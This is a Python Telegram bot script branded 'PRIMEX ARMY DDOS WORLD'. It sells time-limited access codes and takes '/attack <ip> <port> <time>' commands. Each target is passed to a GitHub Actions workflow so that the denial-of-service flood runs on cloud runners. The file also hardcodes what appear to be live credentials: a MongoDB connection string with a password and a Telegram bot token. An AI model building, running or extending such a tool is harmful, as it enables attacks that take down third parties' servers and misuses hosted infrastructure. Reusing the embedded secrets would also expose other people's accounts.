import os
import asyncio
import requests
import random
import string
import dns.resolver
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# --- TERMUX DNS RESOLVER FIX ---
try:
    dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
    dns.resolver.default_resolver.nameservers = ['8.8.8.8']
except:
    pass

# ==========================================
#        🚀 PRIMEX ARMY OFFICIAL 🚀
# ==========================================
# JOIN: @PRIMEXARMY111 | @PRIMEXARMY_OFFICIAL
# CREDIT: @TimeTravellerHu
# REPO: PRIME
# ==========================================

# --- CONFIGURATION ---
# Stable MongoDB URI (No SRV)
MONGO_URI = "mongodb://EAGLESERVER:EAGLESERVER@cluster0-shard-00-00.vevsqns.mongodb.net:27017,cluster0-shard-00-01.vevsqns.mongodb.net:27017,cluster0-shard-00-02.vevsqns.mongodb.net:27017/?ssl=true&authSource=admin&retryWrites=true&w=majority"

# Make sure this Token is New/Valid from @BotFather
TELEGRAM_BOT_TOKEN ='8562477218:AAEI5DUIG24XjfEhPv-LYLXjJLxdFoi1Cjo'
ADMIN_USER_ID = 7654106169

# GitHub Config
GITHUB_TOKEN = 'ghp token'
REPO_OWNER = 'pest kre GitHub userid'
REPO_NAME = 'yha dale repo name'

# MongoDB Setup
client = MongoClient(MONGO_URI)
db = client['PRIMEX_DATABASE'] 
users_collection = db['AUTHORIZED_USERS']
redeem_codes_collection = db['REDEEM_CODES']

async def is_user_allowed(user_id):
    if user_id == ADMIN_USER_ID: return True
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry = user['expiry_date']
        if expiry.tzinfo is None: expiry = expiry.replace(tzinfo=timezone.utc)
        return expiry > datetime.now(timezone.utc)
    return False

async def start(update: Update, context: CallbackContext):
    message = (
        "*🔥 PRIMEX ARMY DDOS WORLD 🔥*\n\n"
        "*OFFICIAL CHANNELS:*\n"
        "🔸 @IM_FLASH_HACKER\n"
        "🔸 @IM_FLASH_HACKER\n\n"
        "*OFF CREDITS:* @IM_FLASH_HACKER\n\n"
        "*Status:* Cloud Connected 🚀"
    )
    await update.message.reply_text(message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await update.message.reply_text("*❌ Access Denied! Join @IM_FLASH_HACKER*")
        return

    if len(context.args) != 3:
        await update.message.reply_text("*⚠️ Usage: /attack <ip> <port> <time>*")
        return

    ip, port, duration = context.args
    await update.message.reply_text(f"*⚔️ Attack Sent by PRIMEX ARMY ⚔️*\n*🎯 Target:* `{ip}:{port}`")

    # GitHub Cloud Trigger
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/EAGLE.yml/dispatches"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    data = {"ref": "main", "inputs": {"ip": ip, "port": port, "duration": duration}}
    
    try:
        requests.post(url, headers=headers, json=data)
    except Exception as e:
        print(f"Error: {e}")

async def gen(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID: return
    if not context.args: return
    time_input = context.args[0]
    code = "PRMX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    delta = timedelta(days=int(time_input[:-1])) if 'd' in time_input else timedelta(minutes=int(time_input[:-1]))
    expiry = datetime.now(timezone.utc) + delta
    redeem_codes_collection.insert_one({"code": code, "expiry_date": expiry, "used": False})
    await update.message.reply_text(f"*🎟️ Code:* `{code}`", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    if not context.args: return
    code = context.args[0]
    data = redeem_codes_collection.find_one({"code": code, "used": False})
    if data:
        users_collection.update_one({"user_id": update.effective_user.id}, {"$set": {"expiry_date": data['expiry_date']}}, upsert=True)
        redeem_codes_collection.update_one({"code": code}, {"$set": {"used": True}})
        await update.message.reply_text("*✅ Activation Successful!*")
    else:
        await update.message.reply_text("*❌ Invalid Code*")

def main():
    try:
        app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("attack", attack))
        app.add_handler(CommandHandler("gen", gen))
        app.add_handler(CommandHandler("redeem", redeem))
        print("🚀 PRIMEX ARMY Bot is starting...")
        app.run_polling()
    except Exception as e:
        print(f"Failed to start bot: {e}")

if __name__ == '__main__':
    main()